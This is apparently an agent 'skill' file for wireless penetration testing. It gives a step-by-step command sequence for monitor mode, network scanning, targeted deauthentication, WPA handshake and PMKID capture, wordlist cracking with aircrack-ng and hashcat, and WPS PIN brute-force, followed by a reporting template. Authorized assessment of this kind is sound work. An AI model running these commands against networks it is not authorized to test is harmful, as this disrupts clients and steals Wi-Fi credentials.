---
id: wifi-recon
name: Wireless Reconnaissance
description: Wireless network discovery, WPA/WPA2 analysis, and WiFi security assessment
category: pentesting
version: "1.0.0"
tags: [wifi, wireless, wpa, wpa2, aircrack, recon]
tools: [aircrack-ng, airodump-ng, aireplay-ng, wash, reaver, wifite, iwconfig]
requires: [aircrack-ng]
---

# Wireless Reconnaissance Skill

You are performing a wireless network security assessment. This covers discovery,
signal analysis, handshake capture, and WPA/WPA2 cracking methodology.


## Phase 1: Interface Preparation

1. **Identify Wireless Adapters** — Locate capable interfaces
   - `iwconfig` or `ip link show` to list wireless interfaces
   - Verify monitor mode support: `iw list | grep -A 5 "Supported interface modes"`

2. **Enable Monitor Mode** — Switch adapter to monitor mode
   - `airmon-ng check kill` — Kill interfering processes
   - `airmon-ng start wlan0` — Enable monitor mode (creates wlan0mon)
   - Verify: `iwconfig wlan0mon` should show Mode:Monitor

## Phase 2: Network Discovery

3. **Passive Scanning** — Discover all nearby networks
   - `airodump-ng wlan0mon` — Scan all channels
   - `airodump-ng wlan0mon --band abg` — Include 5GHz band
   - Record: BSSID, ESSID, channel, encryption type, signal strength, clients

4. **Target Identification** — Focus on authorized target network
   - `airodump-ng -c <channel> --bssid <target_bssid> -w capture wlan0mon`
   - Note connected clients (STATION MAC addresses)
   - Identify encryption: OPN, WEP, WPA, WPA2, WPA3

5. **Hidden Network Detection** — Reveal hidden SSIDs
   - Monitor for probe requests from clients
   - Deauthentication will force reconnection revealing SSID

## Phase 3: WPA/WPA2 Handshake Capture

6. **Capture 4-Way Handshake** — Required for offline cracking
   - Wait for natural client connection, or:
   - `aireplay-ng -0 5 -a <bssid> -c <client_mac> wlan0mon` (targeted deauth)
   - Watch airodump for "WPA handshake: <bssid>" confirmation
   - Verify capture: `aircrack-ng capture-01.cap`

7. **PMKID Attack** — Alternative to handshake (WPA2 only)
   - `hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng`
   - `hcxpcapngtool -o hash.22000 pmkid.pcapng`
   - No client deauthentication required

## Phase 4: Cracking

8. **Aircrack-ng** — CPU-based WPA cracking
   - `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`
   - Use custom wordlists based on target context

9. **Hashcat** — GPU-accelerated cracking
   - Convert: `hcxpcapngtool -o hash.22000 capture-01.cap`
   - `hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt`
   - Rule-based: `hashcat -m 22000 hash.22000 wordlist.txt -r best64.rule`

## Phase 5: Additional Assessments

10. **WPS Testing** — Check for WPS vulnerabilities
    - `wash -i wlan0mon` — Identify WPS-enabled networks
    - `reaver -i wlan0mon -b <bssid> -v` — WPS PIN brute-force
    - `bully -b <bssid> -c <channel> wlan0mon` — Alternative WPS attack

11. **Evil Twin / Rogue AP** — (Authorized testing only)
    - Document potential for rogue AP attacks
    - Verify client certificate validation
    - Check for EAP-TLS vs PEAP configuration in enterprise networks

## Phase 5: Reporting

Present findings as:
- Network inventory with encryption types and signal strength
- Weak encryption findings (WEP, open networks, weak WPA passwords)
- WPS vulnerability status
- Cracked credentials (if successful)
- Client device exposure analysis
- Recommendations: WPA3 migration, strong passphrases, disable WPS, 802.1X
